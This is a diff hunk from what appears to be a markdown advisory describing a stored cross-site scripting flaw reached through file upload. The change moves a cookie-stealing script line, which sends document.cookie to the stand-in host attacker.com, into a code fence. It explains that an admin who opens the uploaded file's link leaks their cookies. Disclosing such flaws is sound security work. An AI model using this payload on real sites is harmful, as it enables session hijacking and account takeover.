@@ -21,7 +21,9 @@ The only restriction is that the XSS payload is accessible only by authenticated
 
 Send POST /upload.php with malicious HTML/JS file inside.
 
-> <script> fetch=('http://attacker.com/?cookie='+document.cookie)</script>  
+``` javascript
+<script> fetch=('http://attacker.com/?cookie='+document.cookie)</script>  
+```
 
 After that, if admin decides to go in given link (images.php?id=123) we will get his cookies.  
 
